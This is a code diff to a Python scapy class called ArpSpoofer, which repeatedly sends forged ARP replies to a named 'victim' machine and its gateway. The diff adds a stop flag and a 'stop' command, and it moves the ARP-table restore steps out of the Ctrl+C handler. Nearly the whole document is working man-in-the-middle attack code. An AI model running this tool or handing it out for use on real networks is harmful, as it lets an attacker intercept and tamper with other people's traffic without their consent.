@@ -11,6 +11,7 @@ class ArpSpoofer:
         self.targetIP = targetIP #is Ip address of victim machine
         self.gatewayIP = gatewayIP #is gatewayIP
         self.sourceMAC = gma()
+        self.on = True
 
     @staticmethod
     def get_mac(destinationIP, srcIP):
@@ -22,21 +23,24 @@ class ArpSpoofer:
         scapy.send(packet, verbose=False)
 
     def restore(self, destinationIP, sourceIP):
-        packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=self.get_mac(destinationIP), psrc=sourceIP, hwsrc=self.sourceMAC)
+        packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=scapy.getmacbyip(destinationIP), psrc=sourceIP,
+                           hwsrc=self.sourceMAC)
         scapy.send(packet, count=4, verbose=False)
 
     def start(self):
         print("start arp spoofing")
         packets = 0
-        try:
-            while True:
-                self.spoofer(self.targetIP, self.gatewayIP)
-                self.spoofer(self.gatewayIP, self.targetIP)
-               # print("\r[+] Sent packets " + str(packets)),
-                # sys.stdout.flush()
-                packets += 2
-                time.sleep(1)
-        except KeyboardInterrupt:
-            print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
-            self.restore(self.targetIP, self.gatewayIP)
-            self.restore(self.gatewayIP, self.targetIP)
+        while self.on:
+            self.spoofer(self.targetIP, self.gatewayIP)
+            self.spoofer(self.gatewayIP, self.targetIP)
+           # print("\r[+] Sent packets " + str(packets)),
+            # sys.stdout.flush()
+            packets += 2
+            time.sleep(1)
+
+        self.restore(self.targetIP, self.gatewayIP)
+        self.restore(self.gatewayIP, self.targetIP)
+
+    def set_on(self, input):
+        if input=='stop':
+            self.on=False
